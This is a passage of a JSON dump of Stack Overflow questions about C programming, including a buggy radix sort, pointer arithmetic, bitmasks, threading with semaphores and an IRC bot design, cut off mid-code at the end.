sorted integers in\n//       that queue\nqueue_node_t * radixSort(const queue_node_t *arrInts, queue_t *queue[], int size){\n    queue_node_t *curNodep = arrInts; // Node to be checked\n    int i, curNum = curNodep-&gt;element.key;\n    if(curNodep == NULL){\n        // If there is no other node left then assign them into 11th queue.\n        for(i=0;i&lt;=9;i++){\n            if(queue[i]-&gt;rearp!=NULL){\n                if(queue[10]-&gt;size == 0){\n                    queue[10]-&gt;rearp = (queue_node_t *)malloc (sizeof(queue_node_t));\n                    queue[10]-&gt;frontp = queue[10]-&gt;rearp;\n                } else {\n                    queue[10]-&gt;rearp-&gt;restp = (queue_node_t *)malloc(sizeof(queue_node_t));\n                    queue[10]-&gt;rearp = queue[10]-&gt;rearp-&gt;restp;\n                }\n                queue[10]-&gt;rearp = queue[i]-&gt;rearp;\n                queue[10]-&gt;size += queue[i]-&gt;size;\n            }\n        }\n        queue[10]-&gt;rearp = radixSort(queue[10]-&gt;rearp, queue, size);\n    } else {\n                // I used switch statement to handle least significant digit\n        switch(curNum%10){\n        case 0:\n            if(queue[0]-&gt;size == 0){\n                queue[0]-&gt;rearp = (queue_node_t *)malloc (sizeof(queue_node_t));\n                queue[0]-&gt;frontp = queue[0]-&gt;rearp;\n            } else {\n                queue[0]-&gt;rearp-&gt;restp = (queue_node_t *)malloc(sizeof(queue_node_t));\n                queue[0]-&gt;rearp = queue[0]-&gt;rearp-&gt;restp;\n            }\n            ++(queue[0]-&gt;size);\n            queue[0]-&gt;rearp-&gt;element = curNodep-&gt;element;\n            queue[0]-&gt;rearp-&gt;restp = NULL;\n            radixSort(curNodep-&gt;restp, queue, size);\n            break;\n        case 1:\n            if(queue[1]-&gt;size == 0){\n                queue[1]-&gt;rearp = (queue_node_t *)malloc (sizeof(queue_node_t));\n                queue[1]-&gt;frontp = queue[0]-&gt;rearp;\n            } else {\n                queue[1]-&gt;rearp-&gt;restp = (queue_node_t *)malloc(sizeof(queue_node_t));\n                queue[1]-&gt;rearp = queue[1]-&gt;rearp-&gt;restp;\n            }\n            ++(queue[1]-&gt;size);\n            queue[1]-&gt;rearp-&gt;element = curNodep-&gt;element;\n            queue[1]-&gt;rearp-&gt;restp = NULL;\n                        // I tried to make recursion but I guess this is one the problems\n            radixSort(curNodep-&gt;restp, queue, size);\n            break;\n        case 2:\n            if(queue[2]-&gt;size == 0){\n                queue[2]-&gt;rearp = (queue_node_t *)malloc (sizeof(queue_node_t));\n                queue[2]-&gt;frontp = queue[2]-&gt;rearp;\n            } else {\n                queue[2]-&gt;rearp-&gt;restp = (queue_node_t *)malloc(sizeof(queue_node_t));\n                queue[2]-&gt;rearp = queue[2]-&gt;rearp-&gt;restp;\n            }\n            ++(queue[2]-&gt;size);\n            queue[2]-&gt;rearp-&gt;element = curNodep-&gt;element;\n            queue[2]-&gt;rearp-&gt;restp = NULL;\n            radixSort(curNodep-&gt;restp, queue, size);\n            break;\n        case 3:\n            if(queue[3]-&gt;size == 0){\n                queue[3]-&gt;rearp = (queue_node_t *)malloc (sizeof(queue_node_t));\n                queue[3]-&gt;frontp = queue[3]-&gt;rearp;\n            } else {\n                queue[3]-&gt;rearp-&gt;restp = (queue_node_t *)malloc(sizeof(queue_node_t));\n                queue[3]-&gt;rearp = queue[3]-&gt;rearp-&gt;restp;\n            }\n            ++(queue[3]-&gt;size);\n            queue[3]-&gt;rearp-&gt;element = curNodep-&gt;element;\n            queue[3]-&gt;rearp-&gt;restp = NULL;\n\n            queue[10]-&gt;rearp = radixSort(curNodep-&gt;restp, queue, size);\n            break;\n        case 4:\n            if(queue[4]-&gt;size == 0){\n                queue[4]-&gt;rearp = (queue_node_t *)malloc (sizeof(queue_node_t));\n                queue[4]-&gt;frontp = queue[4]-&gt;rearp;\n            } else {\n                queue[4]-&gt;rearp-&gt;restp = (queue_node_t *)malloc(sizeof(queue_node_t));\n                queue[4]-&gt;rearp = queue[4]-&gt;rearp-&gt;restp;\n            }\n            ++(queue[4]-&gt;size);\n            queue[4]-&gt;rearp-&gt;element = curNodep-&gt;element;\n            queue[4]-&gt;rearp-&gt;restp = NULL;\n            radixSort(curNodep-&gt;restp, queue, size);\n            break;\n        case 5:\n            if(queue[5]-&gt;size == 0){\n                queue[5]-&gt;rearp = (queue_node_t *)malloc (sizeof(queue_node_t));\n                queue[5]-&gt;frontp = queue[5]-&gt;rearp;\n            } else {\n                queue[5]-&gt;rearp-&gt;restp = (queue_node_t *)malloc(sizeof(queue_node_t));\n                queue[5]-&gt;rearp = queue[5]-&gt;rearp-&gt;restp;\n            }\n            ++(queue[5]-&gt;size);\n            queue[5]-&gt;rearp-&gt;element = curNodep-&gt;element;\n            queue[5]-&gt;rearp-&gt;restp = NULL;\n\n            radixSort(curNodep-&gt;restp, queue, size);\n            break;\n        case 6:\n            if(queue[6]-&gt;size == 0){\n                queue[6]-&gt;rearp = (queue_node_t *)malloc (sizeof(queue_node_t));\n                queue[6]-&gt;frontp = queue[6]-&gt;rearp;\n            } else {\n                queue[6]-&gt;rearp-&gt;restp = (queue_node_t *)malloc(sizeof(queue_node_t));\n                queue[6]-&gt;rearp = queue[6]-&gt;rearp-&gt;restp;\n            }\n            ++(queue[6]-&gt;size);\n            queue[6]-&gt;rearp-&gt;element = curNodep-&gt;element;\n            queue[6]-&gt;rearp-&gt;restp = NULL;\n\n            radixSort(curNodep-&gt;restp, queue, size);\n            break;\n        case 7:\n            if(queue[7]-&gt;size == 0){\n                queue[7]-&gt;rearp = (queue_node_t *)malloc (sizeof(queue_node_t));\n                queue[7]-&gt;frontp = queue[7]-&gt;rearp;\n            } else {\n                queue[7]-&gt;rearp-&gt;restp = (queue_node_t *)malloc(sizeof(queue_node_t));\n                queue[7]-&gt;rearp = queue[7]-&gt;rearp-&gt;restp;\n            }\n            ++(queue[7]-&gt;size);\n            queue[7]-&gt;rearp-&gt;element = curNodep-&gt;element;\n            queue[7]-&gt;rearp-&gt;restp = NULL;\n\n            radixSort(curNodep-&gt;restp, queue, size);\n            break;\n        case 8:\n            if(queue[8]-&gt;size == 0){\n                queue[8]-&gt;rearp = (queue_node_t *)malloc (sizeof(queue_node_t));\n                queue[8]-&gt;frontp = queue[8]-&gt;rearp;\n            } else {\n                queue[8]-&gt;rearp-&gt;restp = (queue_node_t *)malloc(sizeof(queue_node_t));\n                queue[8]-&gt;rearp = queue[8]-&gt;rearp-&gt;restp;\n            }\n            ++(queue[8]-&gt;size);\n            queue[8]-&gt;rearp-&gt;element = curNodep-&gt;element;\n            queue[8]-&gt;rearp-&gt;restp = NULL;\n\n            radixSort(curNodep-&gt;restp, queue, size);\n            break;\n        case 9:\n            if(queue[9]-&gt;size == 0){\n                queue[9]-&gt;rearp = (queue_node_t *)malloc (sizeof(queue_node_t));\n                queue[9]-&gt;frontp = queue[9]-&gt;rearp;\n            } else {\n                queue[9]-&gt;rearp-&gt;restp = (queue_node_t *)malloc(sizeof(queue_node_t));\n                queue[9]-&gt;rearp = queue[9]-&gt;rearp-&gt;restp;\n            }\n            ++(queue[9]-&gt;size);\n            queue[9]-&gt;rearp-&gt;element = curNodep-&gt;element;\n            queue[9]-&gt;rearp-&gt;restp = NULL;\n\n            radixSort(curNodep-&gt;restp, queue, size);\n            break;\n        }\n    }\n\n    return queue[10]-&gt;rearp;\n}\n</code></pre>\n\n<p><strong>Edit 1 ( Made some progress )</strong></p>\n\n<p>I followed suggestions from William Morris. I had to ask same question on CodeReview and he gave me some instructions to make my code clearer.</p>\n\n<p>I divided my function into functions and also stopped using recursion.</p>\n\n<p><em>Firstly</em>, I created a add_to_q function which adds value to related queue and it helped to get rid of code duplication. By the way James Khoury's way is simplest one but it again uses recursion.</p>\n\n<pre><code>void add_to_q(queue_t *queue_arr[], int value, int pos) {\nif(queue_arr[pos]-&gt;size == 0){\n    queue_arr[pos]-&gt;rearp = (queue_node_t *)malloc (sizeof(queue_node_t));\n    queue_arr[pos]-&gt;frontp = queue_arr[pos]-&gt;rearp;\n} else {\n    queue_arr[pos]-&gt;rearp-&gt;restp = (queue_node_t *)malloc(sizeof(queue_node_t));\n    queue_arr[pos]-&gt;rearp = queue_arr[pos]-&gt;rearp-&gt;restp;\n}\nqueue_arr[pos]-&gt;rearp-&gt;element = value;\nqueue_arr[pos]-&gt;size++;\n}\n</code></pre>\n\n<p><em>Secondly</em> I created other helper functions. One is add_to_eleventh which simply adds all queue elements to the eleventh queue's rear. In my opinion, it is doing what question wants.</p>\n\n<pre><code>queue_t * add_to_eleventh(queue_t *queue[]) {\nint i;\nfor(i=0;i&lt;=9;i++){\n    while(queue[i]-&gt;frontp != NULL){\n        if(queue[10]-&gt;size == 0){\n            queue[10]-&gt;rearp = (queue_node_t *)malloc (sizeof(queue_node_t));\n            queue[10]-&gt;frontp = queue[10]-&gt;rearp;\n        } else {\n            queue[10]-&gt;rearp-&gt;restp = (queue_node_t *)malloc(sizeof(queue_node_t));\n            queue[10]-&gt;rearp = queue[10]-&gt;rearp-&gt;restp;\n        }\n        if ( queue[i]-&gt;size != 0 ){\n            queue[10]-&gt;rearp-&gt;element = queue[i]-&gt;frontp-&gt;element;\n            printf(\"---%d***\",queue[i]-&gt;frontp-&gt;element);\n        }\n        queue[10]-&gt;size+=1;\n        queue[i]-&gt;frontp = queue[i]-&gt;frontp-&gt;restp;\n        queue[10]-&gt;rearp-&gt;restp = NULL;\n    }\n}\nreturn queue[10];\n}\n</code></pre>\n\n<p><em>Thirdly</em>, my last helper function is back_to_ints. Its purpose is take the elements in 11th queue and divide them by ten and return them in a integer array.</p>\n\n<pre><code>void back_to_ints(queue_t *arr[], int *new_arr) {\nqueue_node_t *cur_nodep;\ncur_nodep = arr[10]-&gt;frontp;\nint i = 0, digit;\nwhile(cur_nodep != NULL){\n    cur_nodep-&gt;element/=10;\n    digit = cur_nodep-&gt;element / 10;\n    new_arr[i++] = digit;\n    cur_nodep = cur_nodep-&gt;restp;\n}\n}\n</code></pre>\n\n<p><em>Finally</em> my new sorting function which is now sorts the integers in same digit. Such that, numbers[7] = {112,133,122,334,345,447,346}; </p>\n\n<pre><code>queue_t * radix_sort(int *arr, const int size,queue_t *sorted_arr[]) {\nint i, digit[size], initials[size],j;\nfor(i=0;i&lt;size;i++)\n    initials[i] = arr[i];\ni = 0;\nwhile(initials[i] != 0){\n    j = i;\n    printf(\"initialssss%d\", initials[--j]);\n    back_to_ints(sorted_arr, initials);\n\n    for(i=0;i&lt;size;i++){\n    digit[i] = initials[i] % 10;\n\n    switch (digit[i]) {\n    case 0:\n        add_to_q(sorted_arr, arr[i], 0);\n        break;\n    case 1:\n        add_to_q(sorted_arr, arr[i], 1);\n        break;\n    case 2:\n        add_to_q(sorted_arr, arr[i], 2);\n        break;\n    case 3:\n        add_to_q(sorted_arr, arr[i], 3);\n        break;\n    case 4:\n        add_to_q(sorted_arr, arr[i], 4);\n        break;\n    case 5:\n        add_to_q(sorted_arr, arr[i], 5);\n        break;\n    case 6:\n        add_to_q(sorted_arr, arr[i], 6);\n        break;\n    case 7:\n        add_to_q(sorted_arr, arr[i], 7);\n        break;\n    case 8:\n        add_to_q(sorted_arr, arr[i], 8);\n        break;\n    case 9:\n        add_to_q(sorted_arr, arr[i], 9);\n        break;\n        }\n    }\n    sorted_arr[10] = add_to_eleventh(sorted_arr);\n    i++;\n}\nreturn sorted_arr[10];\n}\n</code></pre>\n\n<p>I solved the question partially. If you want to sort the numbers in same digit, it works. Otherwise, it fails. For instance, your inputs are 112,133,122,334,345,447,346 then the result will be <strong>112  122 133 334 345 346 447</strong>. But, if the user wants to sort something like that(111,13,12,334,345,447,1) it gives <strong>111   1   12  13  334 345 447</strong>. So, how can I overcome this problem.</p>\n\n<p>Also, I have changed my header file a bit.</p>\n\n<pre><code>#ifndef RADIX_H_\n#define RADIX_H_\n\ntypedef struct queue_node_s {\n    int element;\n    struct queue_node_s *restp;\n}queue_node_t;\n\ntypedef struct {\n    queue_node_t *frontp,\n             *rearp;\n    int size;\n}queue_t;\n\nqueue_t * radix_sort(int *arr,const int size, queue_t *sorted_arr[]);\nvoid add_to_q(queue_t *queue_arr[], int value, int pos);\nqueue_t * add_to_eleventh(queue_t *queue[]);\nvoid back_to_ints(queue_t *arr[], int *new_arr);\nvoid displayRadixed(queue_t *sorted[]);\n#endif /* RADIX_H_ */\n</code></pre>\n\n<p>Thank you for reopening my thread...</p>\n"},{"tags":["c++",".net","c","winapi","browser"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13098801,"title":"browser helper object in c++","body":"<p>i am new to win api ,this is what i was using in my code </p>\n\n<p><code>SINK_ENTRY_EX(1, DIID_DWebBrowserEvents2, DISPID_DOCUMENTCOMPLETE, OnDocumentComplete)</code></p>\n\n<p>this is perfectly working</p>\n\n<p><strong>note</strong> :</p>\n\n<p><code>OnDocumentComplete</code>-function pointer </p>\n\n<p><code>DISPID_DOCUMENTCOMPLETE</code> --display id (call the function pointed by function pointer when this event occur)</p>\n\n<p>i just tried the below one which will call the event on changing status bar of browser hide or appear but its not working .</p>\n\n<p><code>SINK_ENTRY_EX(1, DIID_DWebBrowserEvents2, DISPID_ONSTATUSBAR,OnDocumentComplete)</code></p>\n\n<p>can any body tell me what's wrong with this?</p>\n"},{"tags":["c","pointers","increment"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":57,"score":0,"question_id":13262754,"title":"why the address difference is getting printed (according to the pointer type)","body":"<pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n    int *p=0;\n    char *ch=0;\n    p++;\n    ch++;\n    printf (\"%d and %d\\n\",p,ch);\n    return 0;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>4 and 1\n</code></pre>\n\n<ol>\n<li><p>I know the char pointer increments as +1 in the address that it is pointing too.</p></li>\n<li><p>I know the pointer to an int increments as +4 in the address in gcc  that it is pointing too.</p></li>\n<li><p>I know Derefrencing a pointer should be done by the use of * with the pointer.</p></li>\n</ol>\n\n<p>Queries:</p>\n\n<ol>\n<li><p>Why is this not giving any garbage value for p and ch as both are pointers and has not assigned any address;</p></li>\n<li><p>Why is this giving me the address difference that the respective pointer has obtained while incrementing, or is <strong>this a undefined behavior</strong>.</p></li>\n</ol>\n\n<p>3.<strong>Why is the output 4 and 1?</strong></p>\n\n<p>Pl. Explain.</p>\n\n<p>I have compiled this code on gcc-4.3.4.\nIts a C code.\nI am sorry if this comes out to be a copy of some question as I was not able to find any such question on stackoverflow.</p>\n"},{"tags":["c","gtk","kde","gtk3"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":41,"score":0,"question_id":13262938,"title":"How are called these \"widgets\" in Gtk+?","body":"<p>How are called these \"widgets\" in Gtk+: the widget with blue border and the widgets inside on it? is there equivalent in Gtk+?</p>\n\n<p>Note: I'm calling \"widget\" by following Gtk terminology, because I don't know what its real nomenclature in the KDE environment.</p>\n\n<p><img src=\"http://i.stack.imgur.com/aLfuA.png\" alt=\"enter image description here\"></p>\n"},{"tags":["c#","c","mono","monomac","cfstring"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":191,"score":2,"question_id":7027962,"title":"Mono C# PInvoke - Get CFString from external lib","body":"<p>I have a lib that returns a CFString, and I'm trying to get that string value in C#..\nThe problem is that I don't know how to do this in C#..</p>\n\n<p>Making the external function return a CFString won't work as it throws an exception \"Type MonoMac.CoreFoundation.CFString which is passed to unmanaged code must have a StructLayout attribute.\"</p>\n\n<p>Then I thought that I could get the string as a byte array and then convert it to a string in C#, but then, I have another problem, I don't know how to convert in C the CFString to a byte array :/</p>\n\n<pre><code>C# Dll Import stuff\n[DllImport(\"lib\")]\npublic static extern MonoMac.CoreFoundation.CFString  test();   \n\n[DllImport(\"lib\")]\npublic static extern byte[] test();     \n\n\nC Library sample\nCFStringRef test()\n{\nreturn CFSTR(\"test string\");\n}\n</code></pre>\n\n<p>If anyone knows a way to do this please help me out ;)</p>\n\n<p>Thanks</p>\n"},{"tags":["c","bitwise-operators","bitmask"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":13262688,"title":"Quick way to set a bitmask from a boolean in C","body":"<p>In my code I have some checks like this...</p>\n\n<pre><code>if (some_test) {\n   flag |= SOME_FLAG;\n}\nelse {\n   flag &amp;= ~SOME_FLAG;\n}\n</code></pre>\n\n<p>A convenient way around this I found so far is...</p>\n\n<pre><code>flag = (some_test) ? (flag | SOME_FLAG) : (flag &amp; ~SOME_FLAG);\n</code></pre>\n\n<p>This could be made into a macro and its OK, but is there some bit-twiddeling magic to avoid referencing flag twice?, (incase flag us <code>a-&gt;b-&gt;c-&gt;d</code>, it can be nice to avoid this).</p>\n\n<p>Example of what Im looking for (if C could do turnary operations on operators), is...</p>\n\n<pre><code>flag ((some_test) ? (|=) : (&amp;= ~) SOME_FLAG;\n</code></pre>\n\n<p>The example above is only to desctibe what Im looking for, of coruse it cant work.</p>\n"},{"tags":["c","textmate"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13262667,"title":"interactive input in textmate C codes","body":"<p>When I use textmate for writing C codes, I wonder if an interactive input panel will pop up when using functions such as <code>scanf</code>. When I use <code>Command+R</code> for the following simple example codes:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n   int number;\n\n   printf(\"Enter an integer\\n\");\n   scanf(\"%d\",&amp;number);\n\n   printf(\"Integer entered by you is %d\\n\", number);\n\n   return 0;\n}\n</code></pre>\n\n<p>I got the result of </p>\n\n<p><code>Enter an integer</code></p>\n\n<p><code>Integer entered by you is 32767</code></p>\n\n<p>But there was no way to type in, actually. Thank you for clarifying this naive question :)</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13262336,"title":"Program hangs with smaller integers","body":"<p>I'm having issues with the code pasted below where it just hangs during runtime.  VS2010 doesn't give me any warnings or errors.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\n\nvoid clear_buffer(void)\n{\n    while(getchar() != '\\n');\n}\n\nint validate(int low, int high) {\n    int num;\n\n    scanf(\"%d\", &amp;num);\n    while(num &lt; low || num &gt; high) \n    {\n        clear_buffer();\n        printf(\"INVALID! Must enter value between %d and %d: \", low, high);\n        scanf(\"%d\", &amp;num);\n    }\n    return num;\n}\n\nint getRand(int max) {\n    int number;\n    number = rand() % max + 1;\n    return number;\n}\n\nint validatePick(int pick, int one, int two, int three, int four, int five) {\n    int valid = 0;\n\n    if (pick != one &amp;&amp; pick != two &amp;&amp; pick != three &amp;&amp; pick != four &amp;&amp; pick != five) {\n        valid = 1;\n    } else {\n        valid = 0;\n    }\n    return valid;\n}\nvoid prnt(int qty, int one, int two, int three, int four, int five, int six) {\n    int i = 0, flag = 0;\n    while (flag != 2) {\n        flag = 0;\n        if (sort2(&amp;one, &amp;two) == 0 &amp;&amp; sort2(&amp;three, &amp;four) == 0 &amp;&amp; sort2(&amp;five, &amp;six) == 0)\n            flag = 1;\n        if (sort2(&amp;two, &amp;three) == 0 &amp;&amp; sort2(&amp;four, &amp;five) == 0)\n            flag = 1;\n        flag += flag;\n    }\n\n    printf(\"Picks: %d, \", one);\n    while (i &lt;= qty){\n        if (i== 2 &amp;&amp; qty == 2)\n            printf(\"%d\\n\", two);\n        else if (i == 2 &amp;&amp; qty != 2) \n            printf(\"%d, \", two);\n\n        if (i == 3 &amp;&amp; qty == 3) \n            printf(\"%d\\n\", three);\n        else if (i == 3 &amp;&amp; qty != 3) \n            printf(\"%d, \", three);\n\n        if (i == 4 &amp;&amp; qty == 4)\n            printf(\"%d\\n\", four);\n        else if (i == 4  &amp;&amp; qty != 4)\n            printf(\"%d, \", four);\n\n        if (i == 5 &amp;&amp; qty == 5)\n            printf(\"%d\\n\", five);\n        else if (i == 5  &amp;&amp; qty != 5) \n            printf(\"%d, \", five);\n\n        if (i == 6 &amp;&amp; qty == 6) \n            printf(\"%d\\n\", six);\n        i++;\n    }\n}\n\n\n\nint sort2(int *n1, int *n2) {\n    int tmp, valid = 0;\n\n    if (*n1 &gt; *n2)\n    {\n        tmp = *n2;\n        *n2 = *n1;\n        *n1 = tmp;\n        valid = 1;\n    }\n    return valid;\n}\n\nint main () {\n    int num1, num2;\n    int pick, one = 0, two = 0, three = 0, four = 0, five = 0, six = 0;\n\n    srand(time(NULL));\n\n    printf(\"LOTTERY GENERATOR\\n\");\n    printf(\"Enter the maximum value between 1 and 100: \");\n    num1 = validate(2,100);\n    printf(\"Enter quantity of numbers to pick, between 1 and 6: \");\n    num2 = validate(1, 6);\n\n    one = getRand(num1);\n    while (two == 0 || three == 0 || four == 0 || five == 0 || six == 0) {\n        pick = getRand(num1);\n        if (validatePick(pick, one, two, three, four, five) == 1 &amp;&amp; two == 0)\n            two = pick;\n        else if (validatePick(pick, one, two, three, four, five) == 1 &amp;&amp; three == 0)\n            three = pick;\n        else if (validatePick(pick, one, two, three, four, five) == 1 &amp;&amp; four == 0)\n            four = pick;\n        else if (validatePick(pick, one, two, three, four, five) == 1 &amp;&amp; five == 0)\n            five = pick;\n        else  if (validatePick(pick, one, two, three, four, five) == 1)\n            six = pick;\n    }\n    prnt(num2, one, two, three, four, five, six);\n}\n</code></pre>\n\n<p>If I enter say 3 for <code>Enter the maximum value between 1 and 100</code> and then 2 the program just hangs.  I don't understand why it does such.  I don't see an error in the code.  Any ideas?</p>\n"},{"tags":["c","gui","sqlite3","runtime-error"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13262586,"title":"C GUI program crashes during runtime","body":"<p>I'm writing a C GUI program using graphApp GUI library and this code segment cause my program to crash:</p>\n\n<pre><code>...\nchar *str,*sql;\n\n// Read input from text field\nstr = get_control_text(event_name);\n\n// Insert into database\nsprintf(sql,\"INSERT INTO event VALUES('%s');\",str);\ndb_status = sqlite3_exec(db,sql,0,0,&amp;mssg);\n</code></pre>\n\n<p>The <code>get_control_text()</code> is used to read data from a text field and its return type is <code>char *</code>. When I input a string, the program terminate normally, but if the string contains spaces, the program will crash after inserting the data into database. Can someone please help me to find out what's wrong? Thanks.</p>\n"},{"tags":["c"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":31,"score":-2,"question_id":13262447,"title":"how these header files are different from each other","body":"<pre><code>#ifndef __CPU_SIMPLE_ATOMIC_HH__\n#define __CPU_SIMPLE_ATOMIC_HH__\n\n#include \"cpu/simple/base.hh\"\n#include \"params/AtomicSimpleCPU.hh\"\n</code></pre>\n"},{"tags":["c","multithreading","sqlite","bots","irc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":28,"score":-2,"question_id":13262528,"title":"creating a basic shell in C for an IRC bot with another thread running in the background","body":"<p>At the moment I have a very simple IRC bot written in C.  When I run it, it sets up the connection and joins the specified channel.  All the connection details are hard-coded, but this is not an issue.</p>\n\n<p>What I want to do is have a basic shell run at the same time, meaning the loop I currently have to receive text from the IRC channel and parse it is running in a thread in the background.  From this shell, I want to be able to run commands that may send messages to the IRC channel, or may terminate the program gracefully (meaning both threads will need to be closed).  This shell is not meant to be any kind of job control shell.</p>\n\n<p>The primary point of this bot is to monitor the channel for any URLs posted and store them in an SQLite database.  People in the IRC channel will then be able to search the database for particular URLs.  I also want to be able to perform various database commands from the shell, such as search, but also manual insertions and deletions.  I mention this because I assume I will need to ensure all database access is thread-safe.  Also, ideally, I'd prefer insertions to database to be prioritised over searching, but this is practically last on my list of requirements.</p>\n\n<p>Finally, there is the chance that some commands received from the IRC channel could be spawned off into their own threads.  This could be because they are accessing the database, something which definitely has the potential to be less than instant, but also because they are calling a method to block the thread for a period of time to stagger the transmission of messages to the channel.</p>\n\n<p>This is what I'm asking:</p>\n\n<ul>\n<li>How do I go about setting up this sort of program? What sort of structure do I need to run two main threads at once and potentially pass messages between the two?</li>\n<li>Does access to the socket used for communicating to the IRC channel need to be thread-safe?</li>\n<li>How should I go about making the program thread-safe? Will mutex suffice?</li>\n</ul>\n\n<p>If it matters, the program will almost certainly be running on an Ubuntu Server distribution.</p>\n"},{"tags":["c","arrays","pointers"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":42,"score":2,"question_id":13262331,"title":"Accessing an array of pointer to strings","body":"<p>Looking for some clarification on a specific topic related to addressing an array of strings.  There seem to be several related issues but I wasn't able to find one that discussed my question.  If this has been asked before please point me to the relevant thread.</p>\n\n<p>In the snippet of code below (check printf statement), I use the same variable to access the value at a memory location and the address of the memory location.  I'm not quite sure if this is how I'm supposed to write this piece of code.  Is there a better way that will clearly indicate if I'm accessing the address or the value?</p>\n\n<pre><code>char *board[NUM_MAX_ROWS] = {\"0101001\",\n                             \"1101011\"};\n\nint main()\n{\n    int i, num_rows=0, num_cols=0;\n\n    num_cols = strlen(board[0]);\n    num_rows = ARR_SIZE(board);\n\n    for (i=0; i&lt;num_rows; i++)\n        printf(\"%s stored at %p\\n\", board[i], board[i]);\n\n} \n</code></pre>\n\n<p>My first attempt looked like this</p>\n\n<pre><code>while(*board != '\\0')\n{\n    printf(\"%s stored ar %p\\n\", *board, board);\n    board++;\n}\n</code></pre>\n\n<p>Obviously this doesn't work :) but I'm still not quite sure about how this is interpreted by the compiler.</p>\n\n<p>Thanks.</p>\n"},{"tags":["c","printf","fprintf","output"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":50,"score":0,"question_id":13261879,"title":"Which is preferable - printf or fprintf","body":"<p>I know that both of the functions can be used to output to the console.<br>\nI read <a href=\"http://stackoverflow.com/questions/4627330/difference-between-fprintf-printf-sprintf\"><strong>that question</strong></a>, but no one didn't tell which is prefered to be used when outputing to the console.\nSo which function is better, are there any major differences?</p>\n"},{"tags":["c","atoi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13261783,"title":"potential for error in C atoi function","body":"<p>Is there anything you could supply to the atoi function that would produce an error (that may or may not crash the program)?</p>\n\n<p>EDIT: An error is defined as anything that would produce a compilation error, or something that would cause the program to terminate during execution.</p>\n"},{"tags":["c"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":48,"score":0,"question_id":13261908,"title":"Whats wrong with my semaphore usage?","body":"<p>Below is some code so far for a lab where i am supposed to simulate a CPU scheduler. I stopped because i noticed despite my usage of a semaphore (mysem), all the threads try to add their elements to the queue at the same time. Any idea what could be wrong?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;semaphore.h&gt;\n#include \"queue.h\"\n\ntypedef struct {\n int start,end;\n} param;\n\n//globals\nint max_cpu_queue;\nQueue multiLevelArray[3];\n\n//semaphore\nsem_t mysem;\n\nvoid *startRequestThread(void *arg){\n  //process input\n  param *p=(param *)arg;\n\n\n\n  sem_wait(&amp;mysem);\n\n    //add our job to the queue.\n    //getting a request from a request thread, add it to the queue\n\n  int request = p-&gt;start;\n\n  if(!IsFull(multiLevelArray[0])) {\n    printf(\"\\n adding to queue 0 with request %d \\n\",request);\n    Enqueue(request,multiLevelArray[0]);\n  }\n  else if(!IsFull(multiLevelArray[1])) {\n    printf(\"\\n adding to queue 1 with request %d \\n\",request);\n    Enqueue(request,multiLevelArray[1]);\n  }\n  else if(!IsFull(multiLevelArray[2])) {\n    printf(\"\\n adding to queue 2 with request %d \\n\",request);\n    Enqueue(request,multiLevelArray[2]);\n  }\n  else {\n    printf(\"error, all queues are full and we cant anymore requests.\");\n  }\n\n  sem_post(&amp;mysem);\n\n  printf(\"\\nstarted request thread\\n\");\n\n  //this will tell the program we are done\n   //return (void*)(1);\n}\n\nvoid *startServicingThread(void *arg){\n  printf(\"\\n==============STARTED SERVICING THREAD================\\n\");\n\n  while (1!=0) {\n    sem_wait(&amp;mysem);\n    //check the queue for a job. We need the semeaphore to ensure the queues\n    //arent being modified\n\n    //see if theres a job in the P0 Queue\n    if (!IsEmpty(multiLevelArray[0])) {\n      //take a job from this queue.\n      //we need to take in what thread submitted the request too\n      printf(\"\\n service requester (what thread sent the req.) job-length %d\",FrontAndDequeue(multiLevelArray[0]));\n    }\n    else if (!IsEmpty(multiLevelArray[1])) {\n      //take a job from this queue.\n      printf(\"\\nPROCESSING JOB FROM QUEUE 1\\n\");\n      //we need to take in what thread submitted the request too\n      printf(\"\\n service requester (what thread sent the req.) job-length %d\",FrontAndDequeue(multiLevelArray[1]));\n      //remove it from the queue\n    }\n    else if (!IsEmpty(multiLevelArray[2])) {\n      //take a job from this queue.\n      printf(\"\\nPROCESSING JOB FROM QUEUE 2\\n\");\n      //we need to take in what thread submitted the request too\n      printf(\"\\n service requester (what thread sent the req.) job-length %d\",FrontAndDequeue(multiLevelArray[2]));\n      //remove it from the queue\n    }\n    else {\n      // printf(\"no requests yet\");\n    }\n\n    //we processed a round of requests, now lets balance our queues.\n\n    //if the first queue has room, look in the 2nd queue for some.\n    if(!IsFull(multiLevelArray[0])) {\n          if(!IsEmpty(multiLevelArray[1])) {\n            Enqueue(FrontAndDequeue(multiLevelArray[1]),multiLevelArray[0]);\n          }\n          else if(!IsEmpty(multiLevelArray[2])) { //otherwise check the other one\n            Enqueue(FrontAndDequeue(multiLevelArray[2]),multiLevelArray[0]);\n          }\n    }\n    if(!IsFull(multiLevelArray[1])) {\n      if(!IsEmpty(multiLevelArray[2])) {\n        